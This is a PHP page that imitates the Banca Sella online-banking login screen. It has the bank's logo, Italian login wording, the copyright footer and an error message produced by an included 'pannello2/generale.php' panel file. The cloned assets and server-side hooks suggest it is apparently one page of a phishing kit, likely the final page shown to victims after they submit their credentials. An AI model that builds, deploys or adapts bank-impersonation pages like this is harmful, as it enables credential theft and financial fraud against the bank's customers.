<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");


?><!DOCTYPE html>
<html lang="it"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta http-equiv="Cache-Control" content="no-cache&quot;">
<meta http-equiv="expires" content="-1&quot;">
<meta http-equiv="Pragma" content="no-cache&quot;">
<?php script() ?>
<meta http-equiv="Cache-Control" content="no-store&quot;">
<meta http-equiv="X-Content-Type-Options" content="nosniff&quot;">
<meta http-equiv="Content-Type" content="text/html;" charset="iso-8859-1&quot;">
<title>Autenticazione</title>
<link rel="stylesheet" href="./asset2/style.css">   
<script type="text/javascript" async="" src="./asset2/analytics.js.download"></script>
<script src="./asset2/vendor.min.js.download"></script>
<script src="./asset2/emberPm.js.download" type="text/javascript" charset="UTF-8"></script>
<script src="./asset2/optimizescreen.js.download" type="text/javascript" charset="UTF-8"></script>
</head>
<body class="auth-v2">

	













	<div class="a-header">
		<a href="https://www.sella.it/Autenticazione/doLogout.jsp" title="Torna alla home page"><img class="a-logo" src="./asset2/logo_sellait.png" alt="" title=""></a>
	</div>






			<div id="ir7n6tmjsp" style="behavior:url(#default#clientCaps);display:none"></div>
		<object id="zqv3botss3" classid="clsid:{CA8A9780-280D-11CF-A24D-444553540000}" style="display:none"></object>	


	<div class="a-container">

		<div class="a-title-container">
			<div class="a-title">Accedi <span class="a-hidden-xs">ai servizi online</span></div>
		</div>

		<form name="AuthenticationForm" action="https://www.sella.it/Autenticazione/step_one.jsp" method="post">
			<input type="hidden" name="AU_page_code" value="AU_USER_NOT_FOUND_ERROR">

            <div class="a-content-xl">
                <div class="a-form-row">
                    <div class="a-result-msg a-error"> <?php echo messaggiofinale(); ?></div>
                </div>

				

            </div>
		
		</form>	
	</div>

	



     	



<div class="a-float-footer">
	<div class="a-container">
		
		
		
		<div class="a-footer">
			 1996-2021 &nbsp; Banca Sella S.p.A. - P.I. 02224410023 -  
		</div>	
				
	</div>
</div>

                

	
	
	


</body></html>